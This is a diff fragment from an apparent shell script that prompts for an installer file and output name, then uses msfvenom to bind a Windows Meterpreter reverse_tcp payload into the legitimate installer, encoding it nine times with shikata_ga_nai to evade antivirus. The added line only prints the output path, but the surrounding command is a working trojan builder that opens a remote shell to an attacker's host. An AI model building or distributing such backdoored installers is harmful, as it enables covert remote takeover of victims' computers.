@@ -25,3 +25,5 @@ read -p " Installer : " ins;
 read -p " Output : " out;
 
 msfvenom -a x86 --platform windows -x $ins -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -i 9 -f exe -o $out
+
+echo -e " Payload : $out"
